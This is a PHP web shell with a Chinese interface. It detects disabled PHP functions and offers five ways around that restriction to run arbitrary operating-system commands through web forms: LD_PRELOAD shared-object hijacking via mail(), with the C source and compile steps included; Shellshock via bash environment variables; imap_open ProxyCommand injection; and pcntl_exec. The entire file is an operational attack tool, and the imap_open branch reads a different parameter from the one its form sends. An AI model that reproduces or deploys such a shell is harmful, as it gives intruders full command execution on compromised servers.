
<?php
echo "PHP 版本: " . phpversion() . "<br>";
echo "禁用函数: " . ini_get('disable_functions') . "<br>"; 
echo "当前路径: " .__FILE__;
echo "<br/><br/>-------------------------------------------------------------";
?>
<form action="" method="post" id="root_func">
<select name="func" id="func" onchange="root()">
  <option value="C:" selected="selected">----选择绕过方式----</option>
  <option value="getuid">getuid</option>
  <option value="ld_preload">ld_preload</option>
  <option value="bash">bash</option>
  <option value="imap_open">imap_open</option>
  <option value="pcntl">pcntl</option>
</select>
</form>
<script>
function root(){
    var formcc = document.getElementById('root_func');
    formcc.submit()
}
</script>
<?php
if(function_exists('pcntl_exec')) {
	echo "可以尝试pcntl绕过</br>";
}
if(function_exists('putenv')) {
	echo "可以尝试getuid/ld_preload绕过</br>";
}
if(function_exists('imap_open')) {
	echo "可以尝试imap_open绕过</br>";
}


echo "<br/><br/>-------------------------------------------------------------<br/>";
switch($_POST["func"]){
	case "getuid":
highlight_string(
'#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int geteuid() {
	const char* cmdline = getenv("EVIL_CMDLINE");
	if (getenv("LD_PRELOAD") == NULL) { return 0; }
	unsetenv("LD_PRELOAD");
    system(cmdline);
}');
    	echo '<p> <b>getuid使用方法</b>:</br>1. 把上面代码保存为g.c</br>';
    	echo '2. 编译c文件为共享对象文件。 可以在linux系统执行：gcc -shared -fPIC g.c -o g.so &nbsp&nbsp  也可以使用我编译好的t.so</br>';
    	echo '3. 上传t.so到服务器</br>';
        echo '4. 选择绕过方式为getuid，cmd填写要执行的命令；outpath填输出地址，地址必须为可读可写，一般默认即可；sopath填上传的t.so地址';
    	echo '<p><form action="" method="post" id="getuid_form">cmd:<input type="text" name="getuid_cmd" value="ls"></input> outpath:<input type="text" name="outpath" value="/tmp/xx"></input> sopath:<input type="text" name="sopath"></input><input type="submit" name="submit"></input></form>';
    break;
    case "ld_preload":
highlight_string(
'
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>


extern char** environ;
__attribute__ ((__constructor__)) void preload (void)
{
    const char* cmdline = getenv("EVIL_CMDLINE");
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = \'\0\';
            }
    }
    system(cmdline);
}
');
    	echo '<p> <b>ld_preload使用方法</b>:</br>1. 把上面代码保存为l.c</br>';
    	echo '2. 编译c文件为共享对象文件。 可以在linux系统执行：gcc -shared -fPIC l.c -o l.so &nbsp&nbsp  也可以使用我编译好的l.so</br>';
    	echo '3. 上传l.so到服务器</br>';
        echo '4. 选择绕过方式为ld_preload，cmd填写要执行的命令；outpath填输出地址，地址必须为可读可写，一般默认即可；sopath填上传的t.so地址';
    	echo '<p><form action="" method="post" id="ld_preload_form">cmd:<input type="text" name="ld_preload_cmd" value="ls"></input> outpath:<input type="text" name="outpath" value="/tmp/xx"></input> sopath:<input type="text" name="sopath"></input><input type="submit" name="submit"></input></form>';
    break;
    case "bash":
    	echo '<p> <b>bash破壳绕过</b>:</br>';
        echo 'cmd填写要执行的命令；';
    	echo '<p><form action="" method="post" id="bash_form">cmd:<input type="text" name="bash_cmd" value="ls"></input><input type="submit" name="submit"></input></form>';
    break;
    case "imap_open":
    	echo '<p> <b>imap_open绕过</b>:</br>';
        echo 'cmd填写要执行的命令；';
    	echo '<p><form action="" method="post" id="imap_open_form">cmd:<input type="text" name="imap_open_cmd" value="ls"></input><input type="submit" name="submit"></input></form>';
    break;
    case "pcntl":
    	echo '<p> <b>pcntl_exec绕过</b>:</br>';
        echo 'cmd填写要执行的命令；';
    	echo '<p><form action="" method="post" id="pcntl_form">cmd:<input type="text" name="pcntl_cmd" value="ls"></input><input type="submit" name="submit"></input></form>';
    break;
    
}
if($_POST["getuid_cmd"]){
	    echo "<p> <b>执行成功</b> </p>";
        $cmd = $_POST["getuid_cmd"];
        $out_path = $_POST["outpath"];
        $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
        echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
        putenv("EVIL_CMDLINE=" . $evil_cmdline);
        $so_path = $_POST["sopath"];
        putenv("LD_PRELOAD=" . $so_path);
        mail("", "", "", "");
        echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
        unlink($out_path);
}
if($_POST["ld_preload_cmd"]){
    echo "<p> <b>执行成功</b> </p>";
    $cmd = $_POST["ld_preload_cmd"];
    $out_path = $_POST["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
    putenv("EVIL_CMDLINE=" . $evil_cmdline);
    $so_path = $_POST["sopath"];
    putenv("LD_PRELOAD=" . $so_path);
    mail("", "", "", "");
    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
    unlink($out_path);
}
if($_POST["bash_cmd"]){
	function shellshock($cmd) { 
       $tmp = tempnam(".","data"); 
       putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1"); 
       mail("a@127.0.0.1","","","","-bv"); 
       $output = @file_get_contents($tmp); 
       @unlink($tmp); 
       if($output != "") return $output; 
       else return "执行失败."; 
    }
    echo shellshock($_POST["bash_cmd"]); 
}
if($_POST["imap_open_cmd"]){
  	if (!function_exists('imap_open')) {
        die("没有 imap_open 函数!");
	}
    $server = "x -oProxyCommand=echo\t" . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . "|base64\t-d|sh}";
    //$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . '|base64$IFS$()-d|sh}';
    imap_open('{' . $server . ':143/imap}INBOX', '', ''); // or var_dump("\n\nError: ".imap_last_error());
    sleep(5);
    echo file_get_contents("/tmp/cmd_result");
}
if($_POST["pcntl_cmd"]){
    $cmd="/tmp/exec";
    @unlink($cmd);
    @unlink("/tmp/output");
    $c = "#!/usr/bin/env bash\n".$_POST["pcntl_cmd"]." > /tmp/output.txt\n";
    file_put_contents($cmd, $c);
    chmod($cmd, 0777);
    switch (pcntl_fork()) {
    case 0:
        echo "<a href='?p=p'>查看回执</a>";
    exit("");
    default:
        $ret = pcntl_exec($cmd);
    break;
    }
}
if($_GET["p"]==="p"){
	echo file_get_contents('/tmp/output.txt');
}


?>



